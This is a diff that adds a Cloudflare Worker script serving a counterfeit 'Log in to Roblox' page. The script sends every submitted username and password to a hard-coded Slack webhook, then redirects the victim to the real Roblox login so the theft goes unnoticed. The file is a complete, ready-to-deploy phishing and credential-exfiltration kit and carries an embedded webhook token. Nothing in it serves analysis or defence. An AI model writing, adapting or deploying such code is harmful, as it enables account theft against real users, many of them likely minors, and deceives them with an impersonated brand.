@@ -1,0 +1,67 @@
+// language: JavaScript, file: worker.js, target: Cloudflare Workers
+// *serves a static login interface directly and exfiltrates POST credentials to slack*
+
+const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
+const TARGET_URL = "https://www.roblox.com/login";
+
+const LOGIN_PAGE = `<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #121212; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: #1e1e1e; padding: 40px; border-radius: 8px; width: 300px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        h2 { text-align: center; margin-bottom: 24px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #2a2a2a; border: 1px solid #444; color: #fff; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #0074e4; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #005bb5; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Log in to Roblox</h2>
+        <form method="POST">
+            <input type="text" name="username" placeholder="Username/Email/Phone" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>`;
+
+addEventListener("fetch", event => {
+  event.respondWith(handleRequest(event.request));
+})
+
+async function handleRequest(request) {
+  const url = new URL(request.url);
+
+  if (request.method === "POST") {
+    const formData = await request.formData();
+    let fields = "";
+    for (let pair of formData.entries()) {
+      fields += `${pair[0]}: ${pair[1]}\n`;
+    }
+
+    const emailPayload = {
+      text: "```\n" +
+            "From: auth-system@roblox.com\n" +
+            "To: collector@internal\n" +
+            "Subject: Captured Credentials\n\n" +
+            fields +
+            "```"
+    };
+
+    await fetch(SLACK_WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(emailPayload)
+    });
+
+    return Response.redirect(TARGET_URL, 302);
+  }
+
+  return new Response(LOGIN_PAGE, {
+    headers: { "Content-Type": "text/html;charset=UTF-8" }
+  });
+}
